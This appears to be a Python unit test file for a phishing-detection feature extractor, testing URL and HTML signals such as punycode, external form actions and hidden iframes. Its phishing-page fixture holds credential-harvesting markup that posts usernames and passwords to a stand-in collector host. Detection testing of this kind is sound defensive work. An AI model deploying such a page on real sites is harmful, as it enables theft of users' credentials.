"""Unit tests for features.py. Run from the repo root:
    python -m unittest training/test_features.py -v
No extra packages needed.
"""
import sys
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
from features import entropy, extract, registered_domain  # noqa: E402

CLEAN_PAGE = """<html><head><title>My Blog</title>
<link rel="icon" href="/favicon.ico"></head>
<body><a href="/about">About</a><a href="https://other.org/x">Other</a>
<img src="/logo.png"></body></html>"""

PHISH_PAGE = """<html><head><title>Sign in</title>
<link rel="icon" href="https://cdn.evil.net/fav.ico"></head>
<body oncontextmenu="return false">
<form action="http://collector.evil.net/post.php">
<input type="text" name="user"><input type="password" name="pw">
<input type="hidden" name="tok"></form>
<iframe src="http://x.evil.net" width="0" height="0"></iframe>
<a href="#">Forgot</a><a href="#">Help</a></body></html>"""


class UrlFeatureTests(unittest.TestCase):
    def test_ip_host(self):
        self.assertEqual(extract("http://192.168.1.1/login", "")["is_ip_host"], 1)
        self.assertEqual(extract("https://example.com/", "")["is_ip_host"], 0)

    def test_https_flag(self):
        self.assertEqual(extract("https://example.com/", "")["is_https"], 1)
        self.assertEqual(extract("http://example.com/", "")["is_https"], 0)

    def test_subdomain_depth(self):
        self.assertEqual(extract("https://a.b.example.com/", "")["subdomain_depth"], 2)
        self.assertEqual(extract("https://example.com/", "")["subdomain_depth"], 0)
        self.assertEqual(extract("https://shop.example.co.uk/", "")["subdomain_depth"], 1)

    def test_punycode_and_keywords(self):
        f = extract("http://xn--pypal-4ve.com/secure-login", "")
        self.assertEqual(f["has_punycode"], 1)
        self.assertGreaterEqual(f["kw_in_path"], 2)

    def test_special_chars(self):
        f = extract("http://a.com/x?a=1&b=2@z", "")
        self.assertEqual((f["n_qmark"], f["n_eq"], f["n_amp"], f["n_at"]), (1, 2, 1, 1))

    def test_entropy(self):
        self.assertEqual(entropy("aaaa"), 0.0)
        self.assertGreater(entropy("abcd"), 1.9)

    def test_registered_domain(self):
        self.assertEqual(registered_domain("login.paypal.com"), "paypal.com")
        self.assertEqual(registered_domain("a.b.example.co.uk"), "example.co.uk")


class PageFeatureTests(unittest.TestCase):
    def test_clean_page(self):
        f = extract("https://myblog.com/", CLEAN_PAGE)
        self.assertEqual(f["has_password"], 0)
        self.assertEqual(f["form_action_external"], 0)
        self.assertEqual(f["favicon_external"], 0)
        self.assertEqual(f["n_hidden_iframes"], 0)
        self.assertEqual(f["rightclick_blocked"], 0)
        self.assertEqual(f["n_links"], 2)
        self.assertAlmostEqual(f["ext_link_ratio"], 0.5)

    def test_phish_page(self):
        f = extract("https://secure-bank.example.com/login", PHISH_PAGE)
        self.assertEqual(f["has_password"], 1)
        self.assertEqual(f["form_action_external"], 1)
        self.assertEqual(f["n_hidden_inputs"], 1)
        self.assertEqual(f["n_hidden_iframes"], 1)
        self.assertEqual(f["favicon_external"], 1)
        self.assertEqual(f["rightclick_blocked"], 1)
        self.assertEqual(f["null_link_ratio"], 1.0)

    def test_form_action_variants(self):
        base = "https://bank.com/"
        same = '<form action="/login"><input type="password"></form>'
        empty = '<form action=""><input type="password"></form>'
        hash_ = '<form action="#"><input type="password"></form>'
        self.assertEqual(extract(base, same)["form_action_external"], 0)
        self.assertEqual(extract(base, same)["form_action_empty"], 0)
        self.assertEqual(extract(base, empty)["form_action_empty"], 1)
        self.assertEqual(extract(base, hash_)["form_action_empty"], 1)

    def test_subdomain_of_same_site_is_not_external(self):
        html = '<form action="https://auth.bank.com/go"><input type="password"></form>'
        self.assertEqual(extract("https://www.bank.com/", html)["form_action_external"], 0)


class RobustnessTests(unittest.TestCase):
    def test_same_keys_for_every_input(self):
        keys = set(extract("https://a.com/", CLEAN_PAGE))
        self.assertEqual(keys, set(extract("http://1.2.3.4/", PHISH_PAGE)))
        self.assertEqual(keys, set(extract("", "")))
        self.assertEqual(keys, set(extract("http://[bad", "<<<not html>>>")))

    def test_garbage_does_not_crash(self):
        extract("not a url at all", "\x00\x01<div><form><<")
        extract("http://a.com:99999/", None)


if __name__ == "__main__":
    unittest.main()
